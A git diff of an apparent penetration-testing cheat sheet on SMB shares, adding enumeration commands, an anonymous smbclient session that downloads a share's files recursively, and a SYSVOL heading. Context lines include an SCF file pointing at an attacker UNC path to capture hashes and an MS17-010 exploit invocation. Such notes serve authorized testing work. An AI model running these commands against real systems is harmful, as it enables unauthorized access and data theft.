@@ -41,6 +41,8 @@ tree # view files
 
 find . -type d | while read dir; do touch ${dir}/jenriquez 2>/dev/null && echo "${dir}" && rm ${dir}/jenriquez; mkdir ${dir}/jenriquez 2>/dev/null && echo "${dir}" && rmdir ${dir}/jenriquez; done 
 
+find . -type f | xargs file | grep -v 'cannot'
+
 watch -d "ls /mnt/folder/public/*; /mnt/folder/otro*"
 
 SCF
@@ -51,8 +53,17 @@ Command=2
 IconFile=\\X.X.X.X\folder\jenriquez
 ```
 ```Shell
+# Permissions
 smbcacls //10.10.10.40/Users Admin/Desktop -N
 smbcacls //10.10.10.40/Users Admin/Desktop -N | grep Everyone
+```
+
+```Shell
+# Permissions
+smbclient -L //192.168.120.140/folder -N
+>recurse ON
+>prompt OFF
+>mget *
 ```
 
 
@@ -501,6 +512,9 @@ https://www.exploit-db.com/exploits/42031
 ```Shell
 python 42031.py 192.168.76.40 MS17-010/sc_x86_msf.bin
 ```
+
+#### SYSVOL 
+
 
 #### MS09_050 RCE SMB2 
 https://www.exploit-db.com/exploits/40280
